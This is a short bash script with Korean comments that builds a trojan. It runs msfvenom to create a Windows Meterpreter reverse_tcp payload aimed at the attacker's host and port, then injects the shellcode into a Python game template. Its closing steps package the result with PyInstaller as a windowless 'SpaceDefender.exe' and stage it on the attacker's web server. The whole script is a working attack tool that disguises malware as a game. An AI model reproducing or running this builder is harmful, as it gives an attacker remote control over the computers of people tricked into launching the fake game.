#!/bin/bash
# Kali에서 실행 — 셸코드 생성 후 game_template.py에 주입 → game.py 출력
# 사용법: LHOST=172.20.10.12 LPORT=4444 ./inject.sh

set -e

LHOST="${LHOST:-$(hostname -I | awk '{print $1}')}"
LPORT="${LPORT:-4444}"
TEMPLATE="$(dirname "$0")/game_template.py"
OUTPUT="$(dirname "$0")/game.py"
TMP_SC="/tmp/shellcode_raw.py"

echo "[*] LHOST: $LHOST  LPORT: $LPORT"
echo "[*] 셸코드 생성 중..."

msfvenom \
  -p windows/meterpreter/reverse_tcp \
  LHOST="$LHOST" \
  LPORT="$LPORT" \
  -f python \
  -v SHELLCODE \
  -o "$TMP_SC"

# msfvenom -f python 출력에서 bytes 값만 추출
SC_BYTES=$(python3 - <<'PYEOF'
import re, sys
content = open("/tmp/shellcode_raw.py").read()
# 여러 줄 SHELLCODE += ... 을 합쳐서 단일 bytes 리터럴로 변환
parts = re.findall(r'b"([^"]*)"', content)
combined = ''.join(parts)
print('b"' + combined + '"')
PYEOF
)

if [ -z "$SC_BYTES" ]; then
  echo "[!] 셸코드 파싱 실패"
  exit 1
fi

# 템플릿의 ##SHELLCODE## 자리 교체
sed "s|b\"##SHELLCODE##\"|${SC_BYTES}|g" "$TEMPLATE" > "$OUTPUT"

echo "[+] game.py 생성 완료: $OUTPUT"
echo ""
echo "다음 단계 (Windows에서):"
echo "  pip install pygame pyinstaller"
echo "  pyinstaller --onefile --noconsole --name SpaceDefender game.py"
echo "  → dist/SpaceDefender.exe 를 Kali /var/www/html/ 에 복사"
